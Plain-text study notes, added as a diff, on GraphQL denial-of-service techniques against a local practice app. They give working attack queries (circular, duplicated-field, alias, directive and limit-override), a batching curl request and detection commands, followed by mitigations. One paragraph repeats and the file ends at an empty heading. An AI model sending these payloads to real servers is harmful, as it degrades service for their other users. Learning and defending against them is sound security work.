@@ -1,0 +1,221 @@
+GraphQL gives the client the power to request information by 
+making complex queries, if a client makes a complex query using
+the SDL language that is computationally intensive to get validated
+and executed, the client could starve the server of resources
+essentially causing a Denial of Service to other clients.
+
+Think circular/recursive queries
+field duplication alias overloading 
+directive overloading, 
+circular fragments
+object limit overriding
+
+example of schema with circular reference
+type Paste {
+    title: String
+    content: String
+    user_agent: String
+    ip_address: String
+    owner: Owner
+}
+type Owner {
+    ip_address: String
+    user_agent: String
+    pastes: [Paste]
+    name: String
+}
+
+1 Circular reference query 
+query {
+    pastes {
+        owner {
+            pastes {
+                owner {
+                    pastes {
+                        owner {
+                            name
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
+
+Detecting circular references
+- SDL files
+- schema files
+- introspect  get schema files
+
+InQL can automatically detect circular reference given a json schema file
+it can also send introspection queries to generate the schema file to detect 
+
+# inql -f /home/kali/introspection_query.json --generate-cycles -o dvga_cycles
+-f : use the JSON file
+--generate-cycles : perform the circular query detection check
+
+InQL can also run the same check by connecting directly to the GraphQL
+API and obtaining the introspection information.
+# inql -t http://localhost:5013/graphql --generate-cycles -o dvga_cycles
+
+# echo 'http://localhost:5013/graphql' > hosts.txt
+# cat hosts.txt
+
+for host in $(cat hosts.txt); do
+  inql -t "$host" --generate-cycles
+done
+
+unsafe circular reference query 
+https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/unsafe-circular-query.graphql
+
+Circular Introspection Vulnerabilities
+A circular relationship exists in GraphQL’s built-in introspection system.
+Therefore, when introspection is enabled, you could potentially have access
+to a circular query right out of the gate.
+See full_intro_schema.gql 
+we have a circular relationship between __Type.fields and __Field.type
+
+2 Field Duplication
+queries that contain repeating fields. 
+simple to execute, yet less effective than circular queries.
+They are large queries that exhaust the server because of the amount of time they take to process and resolve.
+
+Choose a field that you think might be expensive to resolve, 
+and stuff the query with additional copies of that field’s name.
+query {
+    pastes {
+        title
+        content
+        content
+        content
+        content
+        content
+    }
+}
+
+
+3 Alias DoS 
+you may run into queries that seem
+to take the server longer to process than others. If you identify such a
+query, you can hog system resources by calling the same query over and
+over again. 
+
+there are no limits to the number of aliases a client can
+provide by default, unless the application maintainer has implemented
+specific protections against these types of attacks or the web server has set
+HTTP body length limits. That means we could specify dozens of aliases
+and hog server resources in a single HTTP request
+
+query {
+    one:systemUpdate
+    two:systemUpdate
+    three:systemUpdate
+    four:systemUpdate
+    five:systemUpdate
+}
+
+Since aliases are part of the GraphQL specification, any other vulnerability
+you identify can be combined with aliases.
+
+4 Abusing Directives for Denial of Service
+The directive overloading vulnerability is somewhat similar to field duplication in that it requires us to send many directives via several continuous
+requests. Despite requiring more computing power than a vulnerability
+like circular queries, we’ve found it to be effective at degrading the server’s
+performance.
+
+Abusing Directives for Denial of Service
+The directive overloading vulnerability is somewhat similar to field duplication in that it requires us to send many directives via several continuous
+requests. Despite requiring more computing power than a vulnerability
+like circular queries, we’ve found it to be effective at degrading the server’s
+performance.
+
+query {
+    pastes {
+        title @aa@aa@aa@aa # add as many directives as possible
+        content @aa@aa@aa@aa
+    }
+}
+
+The directive specified in the exploit doesn’t have to exist in GraphQL for it to work.
+You can specify any arbitrary text and prepend it with the @ symbol.
+
+5 Object Limit Overriding
+Some GraphQL applications may allow a client to override this serverside object limit by passing a special argument such as limit, as in this
+example
+
+query {
+    pastes(limit:100000, public: true) {
+        content
+    }
+}
+
+If introspection is disabled, try common keywords such as limit, offset, first, after, last, max, and total.
+
+6 Array based query batching 
+Query batching is any method used to group multiple queries and send them to the GraphQL API in parallel.
+Aliases are one form of query batching, while aliases allow us to only batch operations with of one root
+type like only  queries, mutations or subscriptions, array-based batching allows us to mix queries and mutations
+
+
+Testing for Array-Based Query Batching
+Not supported in GUI clients,  use curl, scripting language
+
+curl http://localhost:5013/graphql -H "Content-Type: application/json"
+-d '[{"query":"query {systemHealth}"},{"query":"query {systemHealth}"}]'
+
+https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/array_based_circular_queries.py
+
+Detecting Query Batching by Using BatchQL
+BatchQL is a small Python utility that
+scans for GraphQL weaknesses. It is able to detect both alias-based batching
+and array-based batching by sending a preflight request and observing the
+errors returned by the server. 
+
+Detecting Query Batching by Using BatchQL
+
+1. Query Cost Analysis
+A: static cost Analysis : where a complexity / cost value is assign to each field requested to 
+be resolved by the server
+
+B: dynamic cost Analysis : cost Analysis is performed on the response after the server has 
+fully resolved the query. allows the server to get real world insight into how much/long it 
+actually costs it to resolve the query rather than assigning arbitrary numbers.
+
+C: credit base rate limiting
+
+D: Query Depth limits 
+
+E: Alias and Array-Based Batching Limits
+Aliases are part of the GraphQL specification so they can’t be disabled easily. 
+Preventing aliases from being abused requires custom middleware code that parses the incoming query, 
+counts the number of specified aliases, and rejects the request if the number appears high enough that it could be dangerous to process.
+
+
+F: Field Duplication Limits
+By default, GraphQL resolves any field specified in a query, even if it’s specified more than once. 
+Even so, we can mitigate against field duplication attacks in multiple ways
+- Query cost Analysis
+- middleware -> counts duplicated fields : reject query or normalize query by eliminating the duplicated fields and consolidating them to one. 
+- calculate query field height 
+
+G: Limits on the Number of Returned Records
+
+7: Query Allow Lists
+The concept of allow lists is simple: you define the GraphQL queries that an application can accept, and you reject any queries that
+aren’t on the list. 
+
+8: Automatic Persisted Queries
+Query allow lists are often used in conjunction with a caching mechanism
+called automatic persisted queries (APQ), which is used for improving the performance of GraphQL queries. 
+Instead of using the normal GraphQL query structure, a GraphQL server that implements APQ can accept hashes that
+represent these queries.
+
+What if the client is an attacker and
+forces the server to cache a malicious query? Will the attacker be able to
+use it in subsequent queries? That is a great question to ask, and also why
+a mechanism like APQ should coexist with a function such as an allow list.
+The server should reject malicious queries before they get cached so that
+only trusted queries can be inserted into the cache.
+
+9: Timeouts 
